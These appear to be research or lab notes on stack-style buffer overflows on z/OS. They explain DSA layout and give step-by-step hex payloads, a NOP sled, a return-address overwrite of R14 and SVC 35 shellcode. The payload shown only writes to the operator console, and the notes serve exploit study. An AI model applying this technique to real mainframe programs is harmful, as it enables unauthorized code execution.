# DAISY_CODE_EXEC

zOS doesnt have a stack it has Dynamic storage area (DSA), basically each function has it own stack which has a pointer to the stack for the function that called it

DSA is made up of these components:
save area back chain
saved registers
next avialable byte
variables

When you call a function it uses the "next aviable byte" (NAB) to make a new DSA below the current

If you overflow a variable defined in the function, nothing gets overwritten, it just goes into empty space (DSA is below code)

To get code exec you need to be editing a variable from a DSA above the current

Then all you need to do is overflow into the r14 (return address) to point to your payload (all memory is executable and there is no stack canaries)

You know if your close to getting code exec if you get this abend.
USER ABEND CODE 4083 - The back chain was found in error.

You know if you changed the return address is you get this abend
SYSTEM ABEND CODE 0C1 -  Operation Exception (you get this when the compiler cant decode the instruction)


IMPORTANT:THE JCL HAS BINARY IN IN, IT NEEDS TO BE UPLOADED WITH BINARY NOT ASCII

STER 1
NORMAL RUN, PRINTS JAKE THEN CONTENTS OF STRINGS

STEP 2
OVERFLOW, FILL STRINGS WITH A LOT OF CHARACTERS
USER ABEND CODE 4083 - The back chain was found in error.
WE HAVE MUCKED UP THE DSA

STEP 3
NOPS AND CHANGE RETURN ADDRESS

STRINGS HEX
070007000700070007000700070007000700070007000700070007000700070007000700
1FAA0248040000001FAA030005C5D0E84040404040404040404040404040404040404040

1FAA0300 IS R14

ALSO NOTICE THAT THE START OF THIS STRING IS IN R15

Storage dump near condition, beginning at location: 1FAA0306      
  +000000 1FAA0306  07000700 07000700 07000700 07001FAA  02480400 
  
Storage around GPR15(1FAA02F0)
+0000 1FAA02F0  07000700 07000700

STEP4

EDIT STRINGS TO WRITE A TO OPERATOR

ADD WTO PLIST IN R15
00050000C1

ADD NOPS

ADD SHELL CODE
181F0A23
L R1,R15
SVC 35

STRINGS HEX
00050000C1000700070007000700070007000700070007000700070007000700181F0A23
1FAA0248040000001FAA030805C3C1784040404040404040404040404040404040404040

